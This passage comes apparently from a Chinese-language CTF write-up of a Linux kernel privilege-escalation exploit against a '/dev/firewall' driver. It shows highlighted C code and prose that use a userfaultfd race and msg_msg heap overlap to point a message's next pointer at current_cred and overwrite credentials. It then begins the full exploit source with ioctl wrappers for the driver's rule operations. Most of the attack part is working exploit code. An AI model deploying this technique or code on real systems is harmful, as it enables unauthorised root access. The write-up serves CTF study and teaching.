</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[Thread 2] Message sent, target overwritten!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;tid[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, allocate_msg2, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// [1]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<p>创建一个新消息队列<code>qid[3]</code>，size设置为0x1028-0x30，则会分配一个kmalloc-4k-0x1000字节的<code>msg_msg</code>（0x30header+0xfd0data）的内存和一个kmalloc-64-0x30字节的<code>msg_msgseg</code>（8字节next指针和0x28data），会分别占位刚才释放的两处内存</p>
<p>同时这次缓冲区在<code>page_2+PAGE_SIZE-0x10</code>，因为另一个线程中使用<code>userfaultfd</code>监控<code>page_2+PAGE_SIZE</code></p>
<p><code>load_msg()</code>执行中触发缺页异常，内存如下</p>
<p><img src="https://md.buptmerak.cn/uploads/e5690839-eb34-4b84-a1a7-812664ea12e4.png" alt="" /></p>
<p>注意到此时<code>qid[2]</code>的<code>msg_msgseg</code>变成了<code>qid[3]</code>的<code>msg_header</code>，且当前<code>qid[2]</code>和<code>qid[3]</code>中消息均处于缺页异常中</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page_fault_location == page_1 + PAGE_SIZE)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 1] Page fault at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, page_fault_location);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buff, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 1] Releasing faulting thread</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *msg = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *)(buff + </span><span style="color:#d08770;">0x1000 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        msg-&gt;m_type =  </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        msg-&gt;m_ts = </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        msg-&gt;next = (uint64_t)(cred_struct - </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// [1]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        ufd_copy.</span><span style="color:#bf616a;">dst </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)(page_fault_location);
</span><span style="color:#c0c5ce;">        ufd_copy.</span><span style="color:#bf616a;">src </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)(&amp;buff);
</span><span style="color:#c0c5ce;">        ufd_copy.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= PAGE_SIZE;
</span><span style="color:#c0c5ce;">        ufd_copy.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        ufd_copy.</span><span style="color:#bf616a;">copy </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(;;)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(release_pfh_1)
</span><span style="color:#c0c5ce;">            {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(ufd, UFFDIO_COPY, &amp;ufd_copy) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                {
</span><span style="color:#c0c5ce;">                    </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ioctl(UFFDIO_COPY)</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">                    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">                </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 1] Faulting thread released</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<p>接下来可以先修复<code>qid[2]</code>的缺页异常，从而修改<code>qid[3]</code>的<code>msg_header</code>中的<code>next</code>指向<code>current_cred</code>结构体-0x8字节处，再恢复<code>qid[3]</code>的缺页异常，就能够将数据写入<code>current_cred</code>中，从而完成提权</p>
<p>当第一个异常线程释放时，内存如下</p>
<p><img src="https://md.buptmerak.cn/uploads/6ee47dd6-001e-455d-af9f-03d41d62e904.png" alt="" /></p>
<p>接着向<code>cred</code>写入数据并释放第二个异常线程</p>
<p><img src="https://md.buptmerak.cn/uploads/9d1eff69-04a8-48ca-90af-7e5d53dc212e.png" alt="" /></p>
<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdint.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/wait.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ipc.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/msg.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">poll.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">pthread.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/userfaultfd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/netlink.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">arpa/inet.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ADD_RULE </span><span style="color:#d08770;">0x1337babe
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DELETE_RULE </span><span style="color:#d08770;">0xdeadbabe
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">EDIT_RULE </span><span style="color:#d08770;">0x1337beef
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">SHOW_RULE </span><span style="color:#d08770;">0xdeadbeef
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DUPLICATE_RULE </span><span style="color:#d08770;">0xbaad5aad
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">MSG_COPY </span><span style="color:#d08770;">040000
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">NF_DROP </span><span style="color:#d08770;">0
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">NF_ACCEPT </span><span style="color:#d08770;">1
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">NF_STOLEN </span><span style="color:#d08770;">2
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">NF_QUEUE </span><span style="color:#d08770;">3
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">NF_REPEAT </span><span style="color:#d08770;">4
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">NF_STOP </span><span style="color:#d08770;">5
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">INBOUND </span><span style="color:#d08770;">0
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">OUTBOUND </span><span style="color:#d08770;">1
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DESC_MAX </span><span style="color:#d08770;">0x800
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">PAGE_SIZE </span><span style="color:#d08770;">0x1000
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">INIT_IPC_NS </span><span style="color:#d08770;">0xd7a0
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DEVICE_PATH &quot;</span><span style="color:#a3be8c;">/dev/firewall</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static int</span><span style="color:#c0c5ce;"> fd, ufd, ufd_qid;
</span><span style="color:#b48ead;">static unsigned char</span><span style="color:#c0c5ce;"> buff[PAGE_SIZE];
</span><span style="color:#b48ead;">static unsigned char</span><span style="color:#c0c5ce;"> buff2[PAGE_SIZE];
</span><span style="color:#b48ead;">static void </span><span style="color:#c0c5ce;">*page_1;
</span><span style="color:#b48ead;">static void </span><span style="color:#c0c5ce;">*page_2;
</span><span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">uint64_t *leak;
</span><span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">uint64_t cred_struct;
</span><span style="color:#b48ead;">static int</span><span style="color:#c0c5ce;"> qid[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">uint64_t large_msg = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">uint64_t queue = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">uint64_t release_pfh_1 = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">uint64_t release_pfh_2 = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef struct
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> iface[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> name[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> ip[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> netmask[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    uint8_t idx;
</span><span style="color:#c0c5ce;">    uint8_t type;
</span><span style="color:#c0c5ce;">    uint16_t proto;
</span><span style="color:#c0c5ce;">    uint16_t port;
</span><span style="color:#c0c5ce;">    uint8_t action;
</span><span style="color:#c0c5ce;">} user_req_t;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">list_head {
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">list_head *next, *prev;
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">evil_msg {
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> list_head m_list;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long int</span><span style="color:#c0c5ce;"> m_type;
</span><span style="color:#c0c5ce;">    size_t m_ts;
</span><span style="color:#c0c5ce;">    uint64_t next;
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">ip_to_ascii</span><span style="color:#c0c5ce;">(uint32_t </span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*ascii_ip;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> in_addr addr;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    addr.</span><span style="color:#bf616a;">s_addr </span><span style="color:#c0c5ce;">= ip;
</span><span style="color:#c0c5ce;">    ascii_ip = (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)</span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(sizeof(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*) * </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(ascii_ip, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">24</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(ascii_ip, </span><span style="color:#8fa1b3;">inet_ntoa</span><span style="color:#c0c5ce;">(addr), </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ascii_ip;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#8fa1b3;">convert_address</span><span style="color:#c0c5ce;">(uint64_t </span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">invalid</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**addresses;
</span><span style="color:#c0c5ce;">    uint32_t h, l;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    addresses = (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**)</span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(sizeof(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*) * </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    h = ((addr &gt;&gt; </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">) &amp; </span><span style="color:#d08770;">0xFFFFFFFF</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    l = (addr &amp; </span><span style="color:#d08770;">0xFFFFFFFF</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    addresses[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = invalid ? &quot;</span><span style="color:#a3be8c;">NopeNope!</span><span style="color:#c0c5ce;">&quot; : </span><span style="color:#8fa1b3;">ip_to_ascii</span><span style="color:#c0c5ce;">(h);
</span><span style="color:#c0c5ce;">    addresses[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] = invalid ? &quot;</span><span style="color:#a3be8c;">NopeNope!</span><span style="color:#c0c5ce;">&quot; : </span><span style="color:#8fa1b3;">ip_to_ascii</span><span style="color:#c0c5ce;">(l);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> addresses;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">free_addresses</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">addresses</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(addresses[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(addresses[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(addresses);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">add_rule</span><span style="color:#c0c5ce;">(uint64_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buff</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**addresses;
</span><span style="color:#c0c5ce;">    user_req_t req;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;req, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_req_t));
</span><span style="color:#c0c5ce;">    addresses = </span><span style="color:#8fa1b3;">convert_address</span><span style="color:#c0c5ce;">(((</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(buff))[</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx;
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= type;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(req.</span><span style="color:#bf616a;">iface</span><span style="color:#c0c5ce;">, buff, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(req.</span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, buff + </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(req.</span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">, addresses[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(req.</span><span style="color:#bf616a;">netmask</span><span style="color:#c0c5ce;">, addresses[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">free_addresses</span><span style="color:#c0c5ce;">(addresses);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, ADD_RULE, &amp;req);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">edit_rule</span><span style="color:#c0c5ce;">(uint64_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buff</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">invalid</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**addresses;
</span><span style="color:#c0c5ce;">    user_req_t req;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;req, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_req_t));
</span><span style="color:#c0c5ce;">    addresses = </span><span style="color:#8fa1b3;">convert_address</span><span style="color:#c0c5ce;">(((</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(buff))[</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">], invalid);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx;
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= type;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(req.</span><span style="color:#bf616a;">iface</span><span style="color:#c0c5ce;">, buff, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(req.</span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, buff + </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(req.</span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">, addresses[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(req.</span><span style="color:#bf616a;">netmask</span><span style="color:#c0c5ce;">, addresses[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!invalid)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">free_addresses</span><span style="color:#c0c5ce;">(addresses);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, EDIT_RULE, &amp;req);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">duplicate_rule</span><span style="color:#c0c5ce;">(uint64_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    user_req_t req;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;req, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_req_t));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= type;
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, DUPLICATE_RULE, &amp;req);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">delete_rule</span><span style="color:#c0c5ce;">(uint64_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    user_req_t req;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;req, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_req_t));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= type;
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, DELETE_RULE, &amp;req);
</span><span style="color:#c0c5ce;">}
